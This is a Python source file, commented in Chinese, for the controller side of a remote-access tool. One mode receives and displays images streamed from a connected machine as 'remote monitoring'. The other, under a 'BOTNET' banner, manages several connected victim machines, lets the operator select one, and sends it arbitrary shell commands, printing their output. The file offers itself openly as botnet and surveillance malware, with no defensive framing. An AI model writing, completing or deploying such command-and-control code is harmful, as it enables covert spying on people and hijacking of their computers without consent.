from random import choice
from socket import *
import os,threading,time,sys,shutil
import cv2
s=socket( )
s.bind(('0.0.0.0',8888))#ip监控建议不动
s.listen()
s,addr=s.accept()
print(addr)
print("1.远程监视2.僵尸网络")
choice=input(":")
s.send(choice.encode())
if choice=='1':
    while True:
        size=int(s.recv(1024).decode())
        s.send('ok'.encode())
        cursize=0
        with open('2.jpg','wb') as file:
            while cursize<size:
                date=s.recv(2048)
                file.write(date)
                cursize+=len(date)
        cv2.namedWindow('image')
        image =cv2.imread('2.jpg')
        cv2.imshow('image',image)
        cv2.waitKey(20)
        s.send('ok'.encode())
if choice=='2':
    import socket
    import threading
    import os
    import time
    os.system('cls')

    version = "v1.0.1"

    title = f"""
    BBBBBBBBBBBBBBBBB        OOOOOOOOO     TTTTTTTTTTTTTTTTTTTTTTT   NNNNNNNN        NNNNNNNNEEEEEEEEEEEEEEEEEEEEEETTTTTTTTTTTTTTTTTTTTTT
    B::::::::::::::::B     OO:::::::::OO   T:::::::::::::::::::::T   N:::::::N       N::::::NE::::::::::::::::::::ET:::::::::::::::::::::T
    B::::::BBBBBB:::::B  OO:::::::::::::OO T:::::::::::::::::::::T   N::::::::N      N::::::NE::::::::::::::::::::ET:::::::::::::::::::::T
    BB:::::B     B:::::BO:::::::OOO:::::::OT:::::TT:::::::TT:::::T   N:::::::::N     N::::::NEE::::::EEEEEEEEE::::ET:::::TT:::::::TT:::::T
      B::::B     B:::::BO::::::O   O::::::OTTTTTT  T:::::T  TTTTTT   N::::::::::N    N::::::N  E:::::E       EEEEEETTTTTT  T:::::T  TTTTTT
      B::::B     B:::::BO:::::O     O:::::O        T:::::T           N:::::::::::N   N::::::N  E:::::E                     T:::::T        
      B::::BBBBBB:::::B O:::::O     O:::::O        T:::::T           N:::::::N::::N  N::::::N  E::::::EEEEEEEEEE           T:::::T        
      B:::::::::::::BB  O:::::O     O:::::O        T:::::T           N::::::N N::::N N::::::N  E:::::::::::::::E           T:::::T        
      B::::BBBBBB:::::B O:::::O     O:::::O        T:::::T           N::::::N  N::::N:::::::N  E:::::::::::::::E           T:::::T        
      B::::B     B:::::BO:::::O     O:::::O        T:::::T           N::::::N   N:::::::::::N  E::::::EEEEEEEEEE           T:::::T        
      B::::B     B:::::BO:::::O     O:::::O        T:::::T           N::::::N    N::::::::::N  E:::::E                     T:::::T        
      B::::B     B:::::BO::::::O   O::::::O        T:::::T           N::::::N     N:::::::::N  E:::::E       EEEEEE        T:::::T        
    BB:::::BBBBBB::::::BO:::::::OOO:::::::O      TT:::::::TT         N::::::N      N::::::::NEE::::::EEEEEEEE:::::E      TT:::::::TT
    B:::::::::::::::::B  OO:::::::::::::OO       T:::::::::T         N::::::N       N:::::::NE::::::::::::::::::::E      T:::::::::T
    B::::::::::::::::B     OO:::::::::OO         T:::::::::T         N::::::N        N::::::NE::::::::::::::::::::E      T:::::::::T
    BBBBBBBBBBBBBBBBB        OOOOOOOOO           TTTTTTTTTTT         NNNNNNNN         NNNNNNNEEEEEEEEEEEEEEEEEEEEEE      TTTTTTTTTTT

    版本: {version}
    {'=' * 134}
    """


    class ClientManager:
        def __init__(self):
            self.clients = {}
            self.current_client = None
            self.lock = threading.Lock()

        def add_client(self, client_socket, address):
            with self.lock:
                client_id = f"{address[0]}:{address[1]}"
                self.clients[client_id] = {
                    'socket': client_socket,
                    'address': address,
                    'current_dir': "正在获取目录...",
                    'active': True
                }
                if self.current_client is None:
                    self.current_client = client_id
                print(f"[*] 新客户端连接: {client_id}")
                print(f"[*] 当前客户端数量: {len(self.clients)}")
                return client_id

        def remove_client(self, client_id):
            with self.lock:
                if client_id in self.clients:
                    try:
                        self.clients[client_id]['socket'].close()
                    except:
                        pass
                    del self.clients[client_id]
                    print(f"[*] 客户端 {client_id} 已断开连接")
                    if self.current_client == client_id:
                        self.current_client = None if not self.clients else next(iter(self.clients))
                    print(f"[*] 剩余客户端数量: {len(self.clients)}")

        def list_clients(self):
            with self.lock:
                return list(self.clients.keys())

        def set_current_client(self, client_id):
            with self.lock:
                if client_id in self.clients:
                    self.current_client = client_id
                    return True
                return False

        def get_current_client(self):
            with self.lock:
                return self.current_client

        def get_client_socket(self, client_id):
            with self.lock:
                client = self.clients.get(client_id)
                return client.get('socket') if client else None

        def update_client_dir(self, client_id, new_dir):
            with self.lock:
                if client_id in self.clients:
                    self.clients[client_id]['current_dir'] = new_dir

        def get_client_dir(self, client_id):
            with self.lock:
                client = self.clients.get(client_id)
                return client.get('current_dir') if client else None

        def mark_client_inactive(self, client_id):
            with self.lock:
                if client_id in self.clients:
                    self.clients[client_id]['active'] = False

        def is_client_active(self, client_id):
            with self.lock:
                client = self.clients.get(client_id)
                return client.get('active') if client else False


    client_manager = ClientManager()


    def handle_client(client_socket, address):
        client_id = client_manager.add_client(client_socket, address)
        try:
            while client_manager.is_client_active(client_id):
                try:
                    client_socket.send("pwd".encode('utf-8'))
                    current_dir = client_socket.recv(4096).decode('utf-8', errors='ignore').strip()
                    client_manager.update_client_dir(client_id, current_dir)
                except Exception as e:
                    print(f"与客户端 {client_id} 通信时出错: {e}")
                    break
                time.sleep(1)
        except Exception as e:
            print(f"处理客户端 {client_id} 时出错: {e}")
        finally:
            client_manager.remove_client(client_id)


    def get_current_prompt():
        current_client = client_manager.get_current_client()
        if current_client:
            current_dir = client_manager.get_client_dir(current_client)
            if current_dir:
                return f"{current_dir}> "
        return "botnet> "


    def server_input_handler():
        while True:
            try:
                prompt = get_current_prompt()
                command = input(prompt)
                if not command.strip():
                    continue
                if command.lower() == 'exit':
                    break
                if command.lower() == 'cls':
                    os.system('cls')
                    print(title)
                    continue
                if command.lower() == 'list':
                    clients = client_manager.list_clients()
                    current_client = client_manager.get_current_client()
                    print("\n当前连接的客户端:")
                    for i, client_id in enumerate(clients, 1):
                        prefix = "* " if client_id == current_client else "  "
                        dir_info = client_manager.get_client_dir(client_id)
                        print(f"{prefix}{i}. {client_id} [目录: {dir_info}]")
                    print()
                    continue
                if command.lower().startswith('sel '):
                    parts = command.split()
                    if len(parts) == 2:
                        try:
                            index = int(parts[1]) - 1
                            clients = client_manager.list_clients()
                            if 0 <= index < len(clients):
                                client_id = clients[index]
                                if client_manager.set_current_client(client_id):
                                    current_dir = client_manager.get_client_dir(client_id)
                                    print(f"\n已选择客户端: {client_id}")
                                    if current_dir:
                                        print(f"当前目录: {current_dir}\n")
                                else:
                                    print("\n选择客户端失败\n")
                            else:
                                print("\n无效的客户端索引\n")
                        except ValueError:
                            print("\n请输入有效的数字索引\n")
                    else:
                        print("\n用法: sel <客户端编号>\n")
                    continue
                current_client = client_manager.get_current_client()
                if current_client is None:
                    print("\n没有可用的客户端，请先选择或等待客户端连接\n")
                    continue
                client_socket = client_manager.get_client_socket(current_client)
                if client_socket is None:
                    print("\n当前客户端不可用\n")
                    continue
                try:
                    client_socket.send(command.encode('utf-8'))
                    output = client_socket.recv(65536).decode('utf-8', errors='ignore')  # 增大缓冲区
                    if command.lower().startswith('cd '):
                        if "目录已更改为:" in output:
                            new_dir = output.split(":")[-1].strip()
                            client_manager.update_client_dir(current_client, new_dir)
                        print(f"\n{output}\n")
                    else:
                        if output:
                            print(f"\n来自 {current_client} 的输出:\n{output}\n")
                except Exception as e:
                    print(f"\n与客户端 {current_client} 通信时出错: {e}\n")
                    client_manager.mark_client_inactive(current_client)
            except KeyboardInterrupt:
                print("\n[*] 输入中断，返回主菜单\n")
            except Exception as e:
                print(f"\n处理输入时出错: {e}\n")


    def start_server():
        host = '192.168.x.xx'#ip要修改自己ip
        port = 1000
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((host, port))
        server.listen(5)
        print(f"[*] 服务器监听在 {host}:{port}")
        input_thread = threading.Thread(target=server_input_handler, daemon=True)
        input_thread.start()
        try:
            while True:
                client_socket, address = server.accept()
                client_handler = threading.Thread(
                    target=handle_client,
                    args=(client_socket, address),
                    daemon=True
                )
                client_handler.start()
        except KeyboardInterrupt:
            print("\n[*] 服务器正在关闭...")
        finally:
            server.close()


    if __name__ == "__main__":
        print(title)
        start_server()
